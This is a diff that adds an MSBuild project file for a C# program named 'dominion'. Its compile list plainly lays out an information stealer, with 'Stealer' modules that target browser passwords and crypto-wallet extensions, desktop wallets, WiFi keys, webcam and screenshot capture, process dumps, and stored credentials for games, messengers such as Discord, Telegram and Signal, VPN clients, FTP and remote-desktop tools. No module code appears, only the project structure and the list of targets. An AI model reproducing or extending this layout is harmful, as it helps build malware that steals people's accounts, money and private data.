@@ -1,0 +1,137 @@
+<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+    <ProjectGuid>{91FCBDCD-40FB-4D10-8B76-58C03E94D0F4}</ProjectGuid>
+    <OutputType>Exe</OutputType>
+    <RootNamespace>dominion</RootNamespace>
+    <AssemblyName>dominion</AssemblyName>
+    <TargetFrameworkVersion>v4.7.2</TargetFrameworkVersion>
+    <FileAlignment>512</FileAlignment>
+    <AutoGenerateBindingRedirects>true</AutoGenerateBindingRedirects>
+    <Deterministic>true</Deterministic>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>bin\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugType>pdbonly</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="System" />
+    <Reference Include="System.Core" />
+    <Reference Include="System.Xml.Linq" />
+    <Reference Include="System.Data.DataSetExtensions" />
+    <Reference Include="Microsoft.CSharp" />
+    <Reference Include="System.Data" />
+    <Reference Include="System.Net.Http" />
+    <Reference Include="System.Xml" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="Program.cs" />
+    <Compile Include="Properties\AssemblyInfo.cs" />
+    <Compile Include="src\dominion\Configuration\configuration.cs" />
+    <Compile Include="src\dominion\Stealer\Applications\AnyDesk.cs" />
+    <Compile Include="src\dominion\Stealer\Applications\CoreFtp.cs" />
+    <Compile Include="src\dominion\Stealer\Applications\CyberDuck.cs" />
+    <Compile Include="src\dominion\Stealer\Applications\DynDns.cs" />
+    <Compile Include="src\dominion\Stealer\Applications\FileZilla.cs" />
+    <Compile Include="src\dominion\Stealer\Applications\FoxMail.cs" />
+    <Compile Include="src\dominion\Stealer\Applications\FTPCommander.cs" />
+    <Compile Include="src\dominion\Stealer\Applications\FTPGetter.cs" />
+    <Compile Include="src\dominion\Stealer\Applications\FTPNavigator.cs" />
+    <Compile Include="src\dominion\Stealer\Applications\FTPRush.cs" />
+    <Compile Include="src\dominion\Stealer\Applications\JetBrains.cs" />
+    <Compile Include="src\dominion\Stealer\Applications\MobaXterm.cs" />
+    <Compile Include="src\dominion\Stealer\Applications\Ngrock.cs" />
+    <Compile Include="src\dominion\Stealer\Applications\Obs.cs" />
+    <Compile Include="src\dominion\Stealer\Applications\PlayIt.cs" />
+    <Compile Include="src\dominion\Stealer\Applications\PuTTy.cs" />
+    <Compile Include="src\dominion\Stealer\Applications\RDCMan.cs" />
+    <Compile Include="src\dominion\Stealer\Applications\Rdp.cs" />
+    <Compile Include="src\dominion\Stealer\Applications\Steam.cs" />
+    <Compile Include="src\dominion\Stealer\Applications\TeamSpeak.cs" />
+    <Compile Include="src\dominion\Stealer\Applications\TeamViewer.cs" />
+    <Compile Include="src\dominion\Stealer\Applications\WinSCP.cs" />
+    <Compile Include="src\dominion\Stealer\Browsers\Chromium.cs" />
+    <Compile Include="src\dominion\Stealer\Browsers\CryptoChromium.cs" />
+    <Compile Include="src\dominion\Stealer\Browsers\CryptoGecko.cs" />
+    <Compile Include="src\dominion\Stealer\Browsers\Gecko.cs" />
+    <Compile Include="src\dominion\Stealer\Browsers\UserAgentGenerator.cs" />
+    <Compile Include="src\dominion\Stealer\Crypto\CryptoDesktop.cs" />
+    <Compile Include="src\dominion\Stealer\Crypto\Grabber.cs" />
+    <Compile Include="src\dominion\Stealer\Device\InstalledBrowsers.cs" />
+    <Compile Include="src\dominion\Stealer\Device\InstalledPrograms.cs" />
+    <Compile Include="src\dominion\Stealer\Device\ProcessDump.cs" />
+    <Compile Include="src\dominion\Stealer\Device\Processes.cs" />
+    <Compile Include="src\dominion\Stealer\Device\ProductKey.cs" />
+    <Compile Include="src\dominion\Stealer\Device\Screenshot.cs" />
+    <Compile Include="src\dominion\Stealer\Device\SystemInformation.cs" />
+    <Compile Include="src\dominion\Stealer\Device\WebCam.cs" />
+    <Compile Include="src\dominion\Stealer\Device\WifiKeys.cs" />
+    <Compile Include="src\dominion\Stealer\Games\BattleNet.cs" />
+    <Compile Include="src\dominion\Stealer\Games\ElectronicArts.cs" />
+    <Compile Include="src\dominion\Stealer\Games\EpicGames.cs" />
+    <Compile Include="src\dominion\Stealer\Games\Growtopia.cs" />
+    <Compile Include="src\dominion\Stealer\Games\Minecraft.cs" />
+    <Compile Include="src\dominion\Stealer\Games\RiotClient.cs" />
+    <Compile Include="src\dominion\Stealer\Games\Roblox.cs" />
+    <Compile Include="src\dominion\Stealer\Games\Uplay.cs" />
+    <Compile Include="src\dominion\Stealer\Games\XBox.cs" />
+    <Compile Include="src\dominion\Stealer\Messangers\Discord.cs" />
+    <Compile Include="src\dominion\Stealer\Messangers\Element.cs" />
+    <Compile Include="src\dominion\Stealer\Messangers\Icq.cs" />
+    <Compile Include="src\dominion\Stealer\Messangers\Jabber.cs" />
+    <Compile Include="src\dominion\Stealer\Messangers\MicroSIP.cs" />
+    <Compile Include="src\dominion\Stealer\Messangers\Outlook.cs" />
+    <Compile Include="src\dominion\Stealer\Messangers\Pidgin.cs" />
+    <Compile Include="src\dominion\Stealer\Messangers\Signal.cs" />
+    <Compile Include="src\dominion\Stealer\Messangers\Skype.cs" />
+    <Compile Include="src\dominion\Stealer\Messangers\Telegram.cs" />
+    <Compile Include="src\dominion\Stealer\Messangers\Tox.cs" />
+    <Compile Include="src\dominion\Stealer\Messangers\Viber.cs" />
+    <Compile Include="src\dominion\Stealer\Vpn\Cisco.cs" />
+    <Compile Include="src\dominion\Stealer\Vpn\CyberGhost.cs" />
+    <Compile Include="src\dominion\Stealer\Vpn\ExpressVPN.cs" />
+    <Compile Include="src\dominion\Stealer\Vpn\Hamachi.cs" />
+    <Compile Include="src\dominion\Stealer\Vpn\HideMyName.cs" />
+    <Compile Include="src\dominion\Stealer\Vpn\IpVanish.cs" />
+    <Compile Include="src\dominion\Stealer\Vpn\MullvadVPN.cs" />
+    <Compile Include="src\dominion\Stealer\Vpn\NordVPN.cs" />
+    <Compile Include="src\dominion\Stealer\Vpn\OpenVPN.cs" />
+    <Compile Include="src\dominion\Stealer\Vpn\PIAVPN.cs" />
+    <Compile Include="src\dominion\Stealer\Vpn\ProtonVPN.cs" />
+    <Compile Include="src\dominion\Stealer\Vpn\Proxifier.cs" />
+    <Compile Include="src\dominion\Stealer\Vpn\RadminVPN.cs" />
+    <Compile Include="src\dominion\Stealer\Vpn\SoftEther.cs" />
+    <Compile Include="src\dominion\Stealer\Vpn\SurfShark.cs" />
+    <Compile Include="src\dominion\Stealer\Vpn\WireGuard.cs" />
+    <Compile Include="src\Entry.cs" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="App.config" />
+  </ItemGroup>
+  <ItemGroup>
+    <Folder Include="src\dominion\Dependencies\Data\" />
+    <Folder Include="src\dominion\Dependencies\Encryption\" />
+    <Folder Include="src\dominion\Dependencies\Hashing\" />
+    <Folder Include="src\dominion\Dependencies\Sql\" />
+    <Folder Include="src\dominion\Stealer\General\" />
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+</Project>
